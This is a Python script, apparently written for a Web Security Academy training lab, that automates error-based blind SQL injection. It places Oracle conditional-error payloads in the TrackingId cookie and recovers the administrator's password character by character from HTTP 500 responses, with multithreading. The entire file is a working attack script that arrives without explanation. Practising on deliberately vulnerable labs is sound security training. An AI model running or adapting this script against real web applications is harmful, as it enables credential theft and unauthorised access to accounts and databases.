import string, requests, time
import concurrent.futures
from typing import List
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

target_url = "https://0a22003a044e984e84fcbd93007700c2.web-security-academy.net/"

cookies = {
    "session": "ZqZnVxeFsQs7PeZtheXEi4LNe9MsI0iz",
}

header = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0"
}

charset = string.ascii_lowercase + string.digits

def verify_injection():
    """Verify that the SQL injection is working correctly"""
    # Test with a known condition that should trigger an error
    test_payload = "ex8ONsCup0c4DFzf'||(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    cookies_with_payload = {"TrackingId": test_payload}
    cookies_with_payload.update(cookies)
    
    try:
        response = requests.get(target_url, cookies=cookies_with_payload, headers=header, timeout=5)
        if response.status_code == 500:
            logging.info("SQL injection verification successful")
            return True
        else:
            logging.error("SQL injection verification failed")
            return False
    except Exception as e:
        logging.error(f"Error during verification: {str(e)}")
        return False

def check_char(position: int, character: str) -> bool:
    payload = f"ex8ONsCup0c4DFzf'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    cookies_with_payload = {"TrackingId": payload}
    cookies_with_payload.update(cookies)

    try:
        response = requests.get(target_url, cookies=cookies_with_payload, headers=header, timeout=5)
        if response.status_code == 500:
            logging.debug(f"Found character '{character}' at position {position}")
            return True
        return False
    except requests.RequestException as e:
        logging.error(f"Request failed for position {position}, character {character}: {str(e)}")
        return False

def check_position(position: int) -> str:
    logging.info(f'Checking position {position}')
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(charset)) as executor:
        future_to_char = {executor.submit(check_char, position, char): char for char in charset}
        
        for future in concurrent.futures.as_completed(future_to_char):
            char = future_to_char[future]
            try:
                if future.result():
                    logging.info(f'Found character for position {position}: {char}')
                    return char
            except Exception as e:
                logging.error(f"Error checking character {char} at position {position}: {str(e)}")
                continue
    
    logging.warning(f"Could not find character for position {position}")
    return "?"

def extract_password(length: int = 20) -> str:
    logging.info("Starting password extraction")
    
    # Verify SQL injection is working before starting
    if not verify_injection():
        logging.error("SQL injection verification failed. Aborting.")
        return ""
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:  # Reduced from 5 to 3 for stability
        positions = list(range(1, length + 1))
        results = list(executor.map(check_position, positions))
    
    password = ''.join(results)
    logging.info(f"Extracted password: {password}")
    return password

if __name__ == "__main__":
    final_password = extract_password(length=20)
    print(f"\nadministrator password: {final_password}")
    
    # Verify the password
    if "?" in final_password:
        print("\n⚠️ Warning: Some characters could not be determined and were replaced with '?'")
    if len(final_password) < 20:
        print("\n⚠️ Warning: The extracted password is shorter than expected")